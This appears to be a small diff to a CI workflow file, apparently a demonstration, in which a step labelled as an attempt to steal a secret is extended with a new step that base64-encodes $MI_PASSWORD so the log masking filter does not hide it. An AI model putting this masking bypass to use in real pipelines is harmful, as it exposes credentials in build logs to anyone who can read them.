@@ -20,3 +20,9 @@ jobs:
       - name: Intentar robar el secret
         run: |
           echo "El secret es: $MI_PASSWORD"
+      
+      - name: Bypass del filtro con base64
+        run: |
+          echo "Secret en base64:"
+          echo $MI_PASSWORD | base64
+          
